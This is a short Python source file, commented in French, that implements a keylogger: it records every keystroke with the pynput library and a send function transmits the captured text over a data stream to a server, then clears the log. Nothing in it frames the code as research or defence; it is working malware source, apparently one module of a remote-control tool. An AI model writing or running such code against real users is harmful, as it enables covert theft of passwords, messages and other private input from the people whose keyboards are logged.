from pynput.keyboard import Listener

key_log = []

def log_keystrokes(key):
    """
    Capture les touches pressées et les stocke dans une liste.
    """
    try:
        key_log.append(key.char)
    except AttributeError:
        if key == key.space:
            key_log.append(" ")
        else:
            key_log.append(f" [{key}] ")

def start_keylogger():
    """
    Initialise le keylogger dans un thread séparé.
    """
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

def send_keylogs(data_stream):
    """
    Envoie les données du keylogger au serveur.
    """
    if key_log:
        logs = "".join(key_log)
        data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
        key_log.clear()  # Vide le journal après l'envoi
    else:
        data_stream.send(str.encode("Aucune frappe enregistrée.\n"))
